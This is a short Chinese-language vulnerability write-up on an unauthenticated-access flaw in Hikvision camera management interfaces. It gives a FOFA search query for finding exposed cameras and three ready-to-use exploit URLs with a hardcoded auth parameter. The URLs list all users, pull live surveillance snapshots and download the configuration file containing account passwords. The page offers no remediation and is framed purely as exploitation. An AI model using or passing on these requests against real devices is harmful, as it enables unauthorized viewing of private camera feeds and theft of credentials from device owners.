## 一、漏洞概述：

  

杭州海康威视系统技术有限公司摄像头管理后台存在未授权，通过构造url可绕过登录查看监控，检索所有用户和配置文件下载。

fofa网址：fofa.so  

fofa搜索：app="HIKVISION-视频监控"

![1617897735_606f290702e293bc11f29.png!small?1617897736159](https://image.3001.net/images/20210409/1617897735_606f290702e293bc11f29.png!small?1617897736159)

![a684797a0e9e4df5b5abee1809b9acfc0746.png](https://image.3001.net/images/20210401/1617242643_60652a13032c0e9edd292.png!small)

  

## 二、漏洞利用：

### 1、利用路径：

http://your-ip/Security/users?auth=YWRtaW46MTEK

YWRtaW46MTEKadmin:11的base64编码

检索所有用户及其角色的列表。

![68ba390a3c8d43efafd1ce634303bb1b0746.png](https://image.3001.net/images/20210401/1617242644_60652a148aa02d81c49a9.png!small)

  

### 2、利用路径：

http://your-ip/onvif-http/snapshot?auth=YWRtaW46MTEK

获取监控快照，不进行身份验证。

![1617242353_606528f11f4da4d724f3d.png!small?1617242354905](https://image.3001.net/images/20210401/1617242353_606528f11f4da4d724f3d.png!small?1617242354905)

  

### 3、利用路径：

http://your-ip/System/configurationFile?auth=YWRtaW46MTEK

下载摄像头配置账号密码文件。

